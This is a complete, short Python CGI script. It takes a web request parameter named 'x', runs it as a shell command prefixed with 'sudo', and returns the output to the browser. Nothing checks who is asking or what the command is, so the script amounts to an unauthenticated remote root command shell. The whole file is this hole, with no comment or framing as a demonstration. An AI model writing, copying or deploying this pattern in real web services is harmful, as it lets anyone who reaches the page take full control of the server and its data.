#!/usr/bin/python3
print("content-type: text/html")
print()

import subprocess
import cgi
import time

data=cgi.FieldStorage()
cmd=data.getvalue("x")
a=subprocess.getoutput("sudo "+cmd)
print(a)




